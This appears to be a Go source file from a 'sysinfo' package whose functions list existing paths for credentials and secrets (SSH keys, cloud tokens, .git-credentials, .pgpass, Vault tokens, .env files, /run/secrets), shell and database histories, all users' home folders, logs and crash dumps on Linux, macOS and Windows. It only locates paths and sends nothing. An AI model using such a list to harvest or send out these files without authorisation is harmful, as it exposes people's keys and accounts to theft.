package sysinfo

import (
	"os"
	"path/filepath"
	"runtime"
	"strconv"
)

// ConfigPaths returns all configuration paths: dotfiles, /etc, cloud creds,
// CI configs, container configs, certificate files.
func ConfigPaths() []string {
	home, _ := os.UserHomeDir()
	var paths []string

	if home != "" {
		dotfiles := []string{
			// SSH / GPG
			".ssh", ".gnupg",
			// Cloud providers
			".aws", ".gcloud", ".azure", ".oci", ".aliyun",
			// Container / orchestration
			".docker", ".kube", ".helm",
			// Package managers / language tools
			".npmrc", ".yarnrc", ".pip", ".gem", ".cargo",
			".nuget", ".m2", ".gradle",
			// Git credentials
			".gitconfig", ".git-credentials",
			// Database client configs
			".my.cnf", ".pgpass", ".netrc",
			// App config dirs
			".config",
			// Env files
			".env", ".env.local", ".env.production",
			// Terraform / IaC
			".terraform.d",
			// Vault
			".vault-token",
		}
		for _, d := range dotfiles {
			p := filepath.Join(home, d)
			if _, err := os.Stat(p); err == nil {
				paths = append(paths, p)
			}
		}

		// CI config files in home or common project roots
		ciFiles := []string{
			".github", ".gitlab-ci.yml", ".circleci",
			"Jenkinsfile", ".travis.yml",
		}
		for _, f := range ciFiles {
			p := filepath.Join(home, f)
			if _, err := os.Stat(p); err == nil {
				paths = append(paths, p)
			}
		}
	}

	switch runtime.GOOS {
	case "linux":
		for _, p := range []string{
			"/etc",
			"/var/spool/cron",
		} {
			if dirExists(p) {
				paths = append(paths, p)
			}
		}
	case "darwin":
		for _, p := range []string{"/etc", "/usr/local/etc"} {
			if dirExists(p) {
				paths = append(paths, p)
			}
		}
		if home != "" {
			if p := filepath.Join(home, "Library"); dirExists(p) {
				paths = append(paths, p)
			}
		}
	case "windows":
		if appdata := os.Getenv("APPDATA"); appdata != "" && dirExists(appdata) {
			paths = append(paths, appdata)
		}
		if localAppdata := os.Getenv("LOCALAPPDATA"); localAppdata != "" && dirExists(localAppdata) {
			paths = append(paths, localAppdata)
		}
	}

	return paths
}

// HomePaths returns all user home directories including Desktop/Documents/Downloads.
func HomePaths() []string {
	var paths []string

	home, _ := os.UserHomeDir()
	if home != "" {
		for _, d := range []string{"Desktop", "Documents", "Downloads"} {
			p := filepath.Join(home, d)
			if dirExists(p) {
				paths = append(paths, p)
			}
		}
	}

	switch runtime.GOOS {
	case "linux":
		if dirExists("/home") {
			entries, _ := os.ReadDir("/home")
			for _, e := range entries {
				if e.IsDir() {
					paths = append(paths, filepath.Join("/home", e.Name()))
				}
			}
		}
		if dirExists("/root") {
			paths = append(paths, "/root")
		}
	case "darwin":
		if dirExists("/Users") {
			entries, _ := os.ReadDir("/Users")
			for _, e := range entries {
				if e.IsDir() && e.Name() != "Shared" {
					paths = append(paths, filepath.Join("/Users", e.Name()))
				}
			}
		}
	case "windows":
		usersDir := `C:\Users`
		if dirExists(usersDir) {
			entries, _ := os.ReadDir(usersDir)
			for _, e := range entries {
				name := e.Name()
				if e.IsDir() && name != "Public" && name != "Default" && name != "Default User" && name != "All Users" {
					paths = append(paths, filepath.Join(usersDir, name))
				}
			}
		}
	}

	return paths
}

// DockerPaths returns Docker runtime data paths (image layers, containers, volumes).
func DockerPaths() []string {
	var paths []string
	candidates := []string{
		"/var/lib/docker",
	}
	if runtime.GOOS == "windows" {
		candidates = []string{
			`C:\ProgramData\Docker`,
			`C:\ProgramData\DockerDesktop`,
		}
	}
	for _, p := range candidates {
		if dirExists(p) {
			paths = append(paths, p)
		}
	}
	return paths
}

// LogsPaths returns log and web application paths.
func LogsPaths() []string {
	var paths []string
	candidates := []string{
		"/var/log",
		"/var/www",
		"/srv",
		"/opt",
	}
	if runtime.GOOS == "windows" {
		candidates = []string{
			`C:\inetpub`,
		}
	}
	for _, p := range candidates {
		if dirExists(p) {
			paths = append(paths, p)
		}
	}
	return paths
}

// TmpfsPaths returns volatile storage paths.
func TmpfsPaths() []string {
	var paths []string
	candidates := []string{
		"/tmp",
		"/dev/shm",
		"/run/secrets",
		"/var/run/secrets",
	}
	if uid := os.Getuid(); uid >= 0 {
		candidates = append(candidates, filepath.Join("/run/user", strconv.Itoa(uid)))
	}
	if runtime.GOOS == "windows" {
		candidates = []string{os.TempDir()}
	}
	for _, p := range candidates {
		if dirExists(p) {
			paths = append(paths, p)
		}
	}
	return paths
}

// HistoryFiles returns shell/tool history files for the current user.
func HistoryFiles() []string {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}
	names := []string{
		".bash_history", ".zsh_history", ".sh_history", ".fish_history",
		".python_history", ".node_repl_history",
		".mysql_history", ".psql_history", ".rediscli_history", ".mongosh",
		".sqlite_history", ".irb_history", ".lesshst",
	}
	var files []string
	for _, name := range names {
		p := filepath.Join(home, name)
		if info, err := os.Stat(p); err == nil && !info.IsDir() {
			files = append(files, p)
		}
	}
	xdg := []string{
		filepath.Join(home, ".local", "share", "fish", "fish_history"),
	}
	for _, p := range xdg {
		if info, err := os.Stat(p); err == nil && !info.IsDir() {
			files = append(files, p)
		}
	}
	return files
}

// CoredumpPaths returns crash dump directories.
func CoredumpPaths() []string {
	var paths []string

	switch runtime.GOOS {
	case "linux":
		candidates := []string{
			"/var/crash",
			"/var/lib/systemd/coredump",
		}
		for _, p := range candidates {
			if dirExists(p) {
				paths = append(paths, p)
			}
		}
	case "darwin":
		home, _ := os.UserHomeDir()
		candidates := []string{
			"/Library/Logs/DiagnosticReports",
		}
		if home != "" {
			candidates = append(candidates, filepath.Join(home, "Library", "Logs", "DiagnosticReports"))
		}
		for _, p := range candidates {
			if dirExists(p) {
				paths = append(paths, p)
			}
		}
	case "windows":
		if local := os.Getenv("LOCALAPPDATA"); local != "" {
			p := filepath.Join(local, "CrashDumps")
			if dirExists(p) {
				paths = append(paths, p)
			}
		}
		if dirExists(`C:\Windows\Minidump`) {
			paths = append(paths, `C:\Windows\Minidump`)
		}
	}

	return paths
}

func dirExists(p string) bool {
	info, err := os.Stat(p)
	return err == nil && info.IsDir()
}
